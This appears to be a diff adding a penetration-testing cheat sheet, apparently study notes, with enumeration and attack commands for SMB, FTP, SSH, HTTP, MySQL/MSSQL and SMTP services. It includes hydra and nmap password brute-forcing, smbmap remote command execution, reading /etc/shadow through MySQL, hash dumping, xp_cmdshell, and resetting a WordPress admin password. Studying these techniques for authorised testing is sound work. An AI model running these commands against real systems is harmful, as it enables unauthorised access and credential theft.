@@ -1,0 +1,119 @@
+## SMB
+
+The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.
+
+netbios - 139  
+smb - 445
+
+IPC - null sessions
+
+net use - command in windows, Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections.  
+      example --> net use * /delete - to delete the network share we have connected  
+                  net use z: \ipaddr\C$ passwd /user:username - here z: denotes the name of drive you want
+
+**nmap scripts for SMB --**  {smb-security-mode, smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-server-stats,smb-enum-domains,smb-enum-groups,smb-enum-services,(smb-enum-shares,smb-ls), smb-protocols, smb-os-discovery}
+
+nmap -p445 --script {scriptname} ipaddr  
+nmap -p445 --script smb-enum-sessions --script-args smbusername=usesrname,smbpassword=password ipaddr
+
+
+**SMBMAP tool**
+
+- smbmap -u username -p 'password' -d . -H ipaddr - to list the shares
+- smbmap -u username -p 'password' -H ipaddr -x 'ipconfig' - to execute a command
+- smbmap -u username -p 'password' -H ipaddr -L - will list the contents/drive
+- smbmap -u username -p 'password' -H ipaddr -r 'C$' - to read the content of C drive
+- smbmap -u username -p 'password' -H ipaddr --upload '/path/file' 'C$\file' - to upload file
+- smbmap -u username -p 'password' -H ipaddr --download 'C$\file'
+
+**other tools for enumeration --**
+
+- metasploit - scanner/smb/smb_version, scanner/smb/smb2, scanner/smb/smb_enumshares, scanner/smb/smb_enumusers, scanner/smb/smb_login, scanner/smb/pipe_auditor
+- nmblookup -A ipaddr (in the output if there is a 20 that means theres a server we can connect to)
+- smbclient -L ippaddr -N
+- smbclient -L 1 \\ipaddr\ -U admin
+- smbclient \\ipaddr\sharename -U admin
+- smbclient //ipaddr/sharename -N -- to connect
+- rpcclient -U ''"" -N ipaddr -- to see if guest login is enabled
+- enum4linux {args} ipaddr - args {-o,-U}
+- enum4linux -u username -p password -U ipaddr
+
+scanner/smb/smb_enumusers - to enumerate smb users (metasploit)
+
+login bruteforcing  
+metasploit - scanner/smb/smb_login  
+hydra - hydra -l username -P file.txt ipaddr smb
+
+* * *
+
+## FTP
+
+- ftp ipaddr
+- hydra -L usernamelist -P passwordlist ipaddr ftp
+- nmap ipaddr --script ftp-brute --script-args userdb=file -p 21
+
+ *to check for anonymous login* -
+        nmap ipaddr -p 21 --script ftp-anon
+- metasploit - auxiliaryscanner/ftp/ftp-version, auxiliary/scanner/ftp/ftp_login, auxiliary/scanner/ftp/anonymous
+
+* * *
+
+## SSH
+
+- ssh root@ipaddr
+- nc ipaddr 22
+- nmap ipaddr -p 22 --script ssh2-enum-algos
+- nmap ipaddr -p 22 --script ssh-hostkey --script-args ssh-hostkey=full
+- nmap ipaddr -p 22 --script ssh-auth-methods --script-args="ssh.user=student" --- or try ssh.user=admin
+- hydra -l username -P passwordlist ipaddr ssh
+- nmap ipaddr -p 22 --script ssh-brute --script-args userdb=usernamefile
+- metasploit -- auxiliary/scanner/ssh/ssh_login, auxiliary/scanner/ssh/ssh_version, auxiliary/scanner/ssh/ssh_enumusers
+
+* * *
+
+## HTTP
+
+- whatweb ippaddr
+- http ipaddr
+- dirb http://ipaddr
+- nmap ippaddr -p 80 --script {http-enum, http-headers,http-methods}
+- nmap --script http-methods --script-args http-methods.url-path=/webdav/ ipaddr
+- nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ ipaddr
+- nmap ipaddr -p 80 -sV -script banner
+- metasploit -- scanner/http/http_version, scanner/http/brute_dirs, scanner/http/http_header, scanner/http/robots_txt, scanner/http/dir_scanner, scanner/http/files_dir, scanner/http/http_login, scanner/http/apache_userdir_enum,
+- curl ippaddr,
+- wget 'http://ipaddr/index'
+- browsh, lynx - to view the website (old tools)
+- robots.txt
+
+* * *
+
+## SQL - 3306 port
+
+- mysql -h ipaddr -u username
+- select load_file("/etc/shadow"); -- in mysql
+
+- nmap scripts -- mysql-empty-password, mysql-info, mysql-users, mysql-databases, mysql-variables, mysql-audit, mysql-dump-hashes,
+example -
+  nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 ipaddr
+
+- **bruteforce login using hydra** - hydra -l root -P passwordfile ipaddr mysql
+
+mysql commands - show databases; use dbname; UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
+
+**MS-SQL**
+- *nmap scripts* -- ms-sql-info, ms-sql-ntlm-info, ms-sql-brute, ms-sql-empty-password, ms-sql-query -- *to run a query*, ms-sql-dump-hashes, ms-sql-xp-cmdshell,
+
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt ipaddr
+nmap -p 1433 --script ms-sql-query --script-args  mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" ipaddr -oN output.txt --Extracting sysusers from MSSQL and storing the output in a file
+
+*metasploit* -- 
+**mysql** -- scanner/mysql/mysql_version, scanner/mysql/mysql_writable_dirs, scanner/mysql/mysql_hashdump, mysql-query, auxiliary/scanner/mysql/mysql_file_enum, scanner/mysql/mysql_login, admin/mysql/mysql_enum, {admin/mysql/mysql_sql - used to run sql queries}, {scanner/mysql/mysql_schemadump - can tell what tables are there under the databases}
+**mssql** -- auxilary/scanner/mssql/mssql_login, auxilary/admin/mssql/mssql_enum, auxilary/admin/mssql/mssql_enum_sql_logins, auxilary/admin/mssql/mssql_exec, auxilary/admin/mssql/mssql_enum_domain_accounts
+
+* * *
+
+## SMTP
+
+metasploit - auxiliary/scanner/smtp/smtp_version, auxiliary/scanner/smtp/smtp_enum
+nmap -sV -script banner 192.80.153.3
